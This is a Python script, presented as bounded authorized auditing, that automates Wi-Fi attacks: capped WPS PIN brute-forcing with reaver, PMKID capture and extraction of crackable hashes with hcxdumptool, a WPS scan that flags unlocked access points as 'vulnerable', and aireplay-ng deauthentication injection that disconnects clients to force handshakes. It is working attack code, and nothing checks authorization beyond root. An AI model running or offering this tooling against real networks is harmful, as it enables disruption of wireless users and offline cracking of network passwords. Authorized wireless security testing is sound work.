#!/usr/bin/env python3
"""Pruebas WiFi acotadas: bloqueo WPS PIN y adquisición PMKID autorizada."""

import argparse
import os
from pathlib import Path
import pwd
import re
import resource
import shutil
import subprocess
import tempfile

from wps_capture_utils import estado_wps, lista_wps


MAC = re.compile(r"(?:[0-9A-F]{2}:){5}[0-9A-F]{2}\Z")
IFACE = re.compile(r"[A-Za-z0-9_.-]+\Z")


def limitar_log():
    resource.setrlimit(resource.RLIMIT_FSIZE, (1024 * 1024, 1024 * 1024))


def limitar_captura():
    recurso = 32 * 1024 * 1024
    resource.setrlimit(resource.RLIMIT_FSIZE, (recurso, recurso))


def validar_objetivo(interfaz, bssid, canal):
    if not IFACE.fullmatch(interfaz):
        raise ValueError("interfaz inválida")
    bssid = bssid.upper()
    if not MAC.fullmatch(bssid):
        raise ValueError("BSSID inválido")
    if not 1 <= canal <= 233:
        raise ValueError("canal fuera de 1..233")
    return bssid


def binario(nombre):
    encontrado = shutil.which(nombre)
    if encontrado:
        return encontrado
    sudo = os.environ.get("SUDO_USER")
    if sudo:
        try:
            ruta = Path(pwd.getpwnam(sudo).pw_dir) / ".local/bin" / nombre
        except KeyError:
            ruta = Path("/ruta/inexistente")
        if ruta.is_file() and os.access(ruta, os.X_OK):
            return str(ruta)
    raise ValueError(f"falta {nombre}")


def wps_pin(interfaz, bssid, canal, intentos=3, seco=False):
    bssid = validar_objetivo(interfaz, bssid, canal)
    if not 1 <= intentos <= 5:
        raise ValueError("--limite-intentos debe estar entre 1 y 5")
    if seco:
        print(f"Plan: wash pasivo y hasta {intentos} pruebas WPS PIN en {bssid}, canal {canal}")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz ya en modo monitor")
    wash, reaver = binario("wash"), binario("reaver")
    os.umask(0o077)
    with tempfile.TemporaryDirectory(prefix="wps_pin_") as temporal:
        try:
            exploracion = subprocess.run([wash, "-u", "-i", interfaz, "-c", str(canal)],
                                         capture_output=True, timeout=10, check=False,
                                         cwd=temporal)
            texto = exploracion.stdout.decode(errors="replace")
        except subprocess.TimeoutExpired as exc:
            texto = (exc.stdout or b"").decode(errors="replace")
        estado = estado_wps(texto.splitlines(), bssid, canal)
        if estado is None:
            print("WPS no observado; no se enviaron intentos PIN")
            return 3
        if estado[1].lower() in {"yes", "si", "sí", "1"}:
            print("WPS anuncia bloqueo; no se enviaron intentos PIN")
            return 0
        with tempfile.TemporaryFile() as registro:
            orden = [reaver, "-i", interfaz, "-b", bssid, "-c", str(canal),
                     "-g", str(intentos), "-d", "5", "-l", "120"]
            if canal > 14:
                orden.append("-5")
            try:
                subprocess.run(orden, stdout=registro, stderr=subprocess.STDOUT,
                               timeout=120, check=False, cwd=temporal,
                               preexec_fn=limitar_log)
            except subprocess.TimeoutExpired:
                print("Límite temporal alcanzado; prueba WPS inconcluyente")
                return 3
            registro.seek(0)
            resumen = registro.read(65536).decode(errors="replace").lower()
    if "wps pin:" in resumen or "wpa psk:" in resumen:
        print("Registro WPS logrado; PIN y contraseña ocultos")
        return 0
    if "rate limiting" in resumen or "locked" in resumen:
        print("Bloqueo o limitación de WPS detectado")
        return 0
    print(f"Hasta {intentos} intentos enviados; resultado inconcluyente, sin clave recuperada")
    return 1


def pmkid(interfaz, bssid, canal, banda=None, segundos=30, salida=None, seco=False):
    bssid = validar_objetivo(interfaz, bssid, canal)
    banda = banda or ("2g" if canal <= 14 else "5g")
    if banda not in {"2g", "5g"}:
        raise ValueError("--banda debe ser 2g o 5g")
    if not 5 <= segundos <= 60:
        raise ValueError("--segundos debe estar entre 5 y 60")
    canal_hcx = f"{canal}{'a' if banda == '2g' else 'b'}"
    if seco:
        print(f"Plan: PMKID de {bssid} en {interfaz}, canal {canal_hcx}, {segundos}s")
        print("hcxdumptool cambiará modo, MAC y canal de esta interfaz durante la captura")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz WiFi dedicada")
    hcx, conversion = binario("hcxdumptool"), binario("hcxpcapngtool")
    os.umask(0o077)
    if salida or os.environ.get("AUDITOR_CAPTURAS_DIR"):
        base = Path(salida or os.environ["AUDITOR_CAPTURAS_DIR"])
    elif os.environ.get("SUDO_USER"):
        base = Path(pwd.getpwnam(os.environ["SUDO_USER"]).pw_dir) / "capturas_wifi"
    else:
        base = Path.home() / "capturas_wifi"
    if base.is_symlink():
        raise ValueError("la salida no puede ser un enlace simbólico")
    base.mkdir(parents=True, exist_ok=True)
    carpeta = Path(tempfile.mkdtemp(prefix="pmkid_", dir=base))

    def ceder_salida():
        if os.environ.get("SUDO_UID") and os.environ.get("SUDO_GID"):
            uid, gid = int(os.environ["SUDO_UID"]), int(os.environ["SUDO_GID"])
            for ruta in carpeta.rglob("*"):
                os.chown(ruta, uid, gid)
            os.chown(carpeta, uid, gid)
    filtro = carpeta / "objetivo.bpf"
    expresion = f"wlan addr3 {bssid.replace(':', '')}"
    compilacion = subprocess.run([hcx, f"--bpfc={expresion}"], capture_output=True,
                                 timeout=10, check=False)
    if compilacion.returncode != 0 or not compilacion.stdout:
        ceder_salida()
        raise ValueError("hcxdumptool no pudo compilar el filtro del BSSID")
    filtro.write_bytes(compilacion.stdout)
    cap = carpeta / "captura.pcapng"
    orden = ["timeout", "--signal=INT", "--kill-after=3s", str(segundos), hcx,
             "-i", interfaz, "-c", canal_hcx, "-w", str(cap), f"--bpf={filtro}",
             "--disable_deauthentication", "--disable_proberequest",
             "--disable_reassociation", "--disable_beacon", "--attemptclientmax=0"]
    with open(os.devnull, "wb") as nada:
        proceso = subprocess.run(orden, stdout=nada, stderr=nada, check=False,
                                 preexec_fn=limitar_captura)
    filtro.unlink(missing_ok=True)
    if proceso.returncode not in {0, 124} or not cap.is_file():
        print("Captura PMKID fallida o vacía")
        ceder_salida()
        return 3
    todos = carpeta / "todos.22000"
    with open(os.devnull, "wb") as nada:
        subprocess.run([conversion, "-o", str(todos), str(cap)], stdout=nada,
                       stderr=nada, timeout=30, check=False)
    objetivo = carpeta / "pmkid_objetivo.22000"
    cantidad = 0
    if todos.is_file():
        with todos.open(encoding="ascii", errors="replace") as entrada, objetivo.open("w") as dest:
            for linea in entrada:
                campos = linea.strip().split("*")
                if len(campos) > 3 and campos[:2] == ["WPA", "01"] and campos[3].lower() == bssid.replace(":", "").lower():
                    dest.write(linea)
                    cantidad += 1
        todos.unlink(missing_ok=True)
    if not cantidad:
        objetivo.unlink(missing_ok=True)
    print(f"PMKID del objetivo: {cantidad}; captura privada: {cap}")
    if cantidad:
        print(f"Analiza por separado: auditor_generico.sh --tipo wifi {objetivo}")
    ceder_salida()
    return 0 if cantidad else 1


def wps_scan(interfaz, canal=None, segundos=20, seco=False):
    """Escaneo pasivo de objetivos WPS: lista APs con WPS y si anuncian bloqueo."""
    if not IFACE.fullmatch(interfaz):
        raise ValueError("interfaz inválida")
    if canal is not None and not 1 <= canal <= 233:
        raise ValueError("canal fuera de 1..233")
    if not 10 <= segundos <= 120:
        raise ValueError("--segundos debe estar entre 10 y 120")
    if seco:
        objetivo = f"canal {canal}" if canal else "barrido de canales"
        print(f"Plan: wash pasivo {segundos}s en {interfaz} ({objetivo}); sin enviar paquetes")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz ya en modo monitor")
    wash = binario("wash")
    orden = [wash, "-u", "-a", "-i", interfaz]
    if canal:
        orden += ["-c", str(canal)]
    os.umask(0o077)
    with tempfile.TemporaryDirectory(prefix="wps_scan_") as temporal:
        try:
            exploracion = subprocess.run(orden, capture_output=True, timeout=segundos,
                                         check=False, cwd=temporal)
            texto = exploracion.stdout.decode(errors="replace")
        except subprocess.TimeoutExpired as exc:
            texto = (exc.stdout or b"").decode(errors="replace")
    filas = lista_wps(texto.splitlines())
    if not filas:
        print("Sin APs con WPS observados; el escaneo no demuestra ausencia de WPS")
        return 1
    candidatos = 0
    for bssid, canal_ap, version, lock, essid in filas:
        bloqueado = lock.lower() in {"yes", "si", "sí", "1"}
        marca = "vulnerable" if not bloqueado else "bloqueado"
        if not bloqueado:
            candidatos += 1
        print(f"{bssid} canal {canal_ap} WPS {version} {marca} {essid}".rstrip())
    if candidatos:
        print(f"{candidatos} objetivo(s) WPS sin bloqueo anunciado; prueba acotada: "
              f"auditor_generico.sh --tipo wifi-wps-pin --interfaz {interfaz} "
              f"--bssid <BSSID> --canal <canal>")
    return 0


def deauth(interfaz, bssid, cliente=None, golpes=10, seco=False):
    """Inyección de desautenticación con aireplay-ng para forzar el 4-way handshake."""
    bssid = validar_objetivo(interfaz, bssid, 1)
    if cliente is not None:
        cliente = cliente.upper()
        if not MAC.fullmatch(cliente):
            raise ValueError("MAC de cliente inválida")
    if not 1 <= golpes <= 20:
        raise ValueError("--golpes debe estar entre 1 y 20")
    destino = f"al cliente {cliente}" if cliente else "a todos los clientes"
    if seco:
        print(f"Plan: aireplay-ng --deauth {golpes} -a {bssid}"
              f"{f' -c {cliente}' if cliente else ''} en {interfaz}; "
              f"desconecta temporalmente {destino} para forzar el 4-way handshake")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz ya en modo monitor")
    aireplay = binario("aireplay-ng")
    orden = [aireplay, "-0", str(golpes), "-a", bssid]
    if cliente:
        orden += ["-c", cliente]
    orden.append(interfaz)
    os.umask(0o077)
    with tempfile.TemporaryDirectory(prefix="deauth_") as temporal:
        try:
            proceso = subprocess.run(orden, capture_output=True, timeout=120,
                                     check=False, cwd=temporal)
        except subprocess.TimeoutExpired:
            print("aireplay-ng superó el límite de 120s; inyección inconcluyente")
            return 3
    resumen = proceso.stdout.decode(errors="replace") + proceso.stderr.decode(errors="replace")
    if "send failed" in resumen.lower():
        print("Inyección fallida: el kernel rechazó los paquetes. "
              "Comprueba que la interfaz está en modo monitor real")
        return 3
    if proceso.returncode != 0:
        print(f"aireplay-ng terminó con código {proceso.returncode}; inyección inconcluyente")
        return 3
    print(f"{golpes} desautenticaciones enviadas a {bssid} ({destino}); "
          "captura el handshake con hcxdumptool/airodump-ng mientras se reconectan")
    return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="accion", required=True)
    for accion in ("wifi-wps-pin", "wifi-pmkid"):
        subparser = sub.add_parser(accion)
        subparser.add_argument("--interfaz", required=True)
        subparser.add_argument("--bssid", required=True)
        subparser.add_argument("--canal", type=int, required=True)
        subparser.add_argument("--dry-run", action="store_true")
        if accion == "wifi-wps-pin":
            subparser.add_argument("--limite-intentos", type=int, default=3)
        else:
            subparser.add_argument("--banda", choices=("2g", "5g"))
            subparser.add_argument("--segundos", type=int, default=30)
            subparser.add_argument("--salida")
    deauth_parser = sub.add_parser("wifi-deauth")
    deauth_parser.add_argument("--interfaz", required=True)
    deauth_parser.add_argument("--bssid", required=True)
    deauth_parser.add_argument("--cliente")
    deauth_parser.add_argument("--golpes", type=int, default=10)
    deauth_parser.add_argument("--dry-run", action="store_true")
    scan_parser = sub.add_parser("wifi-wps-scan")
    scan_parser.add_argument("--interfaz", required=True)
    scan_parser.add_argument("--canal", type=int)
    scan_parser.add_argument("--segundos", type=int, default=20)
    scan_parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    try:
        if args.accion == "wifi-wps-pin":
            return wps_pin(args.interfaz, args.bssid, args.canal,
                           args.limite_intentos, args.dry_run)
        if args.accion == "wifi-deauth":
            return deauth(args.interfaz, args.bssid, args.cliente,
                          args.golpes, args.dry_run)
        if args.accion == "wifi-wps-scan":
            return wps_scan(args.interfaz, args.canal, args.segundos, args.dry_run)
        return pmkid(args.interfaz, args.bssid, args.canal, args.banda,
                     args.segundos, args.salida, args.dry_run)
    except (OSError, ValueError, subprocess.TimeoutExpired) as exc:
        parser.error(str(exc))


if __name__ == "__main__":
    raise SystemExit(main())
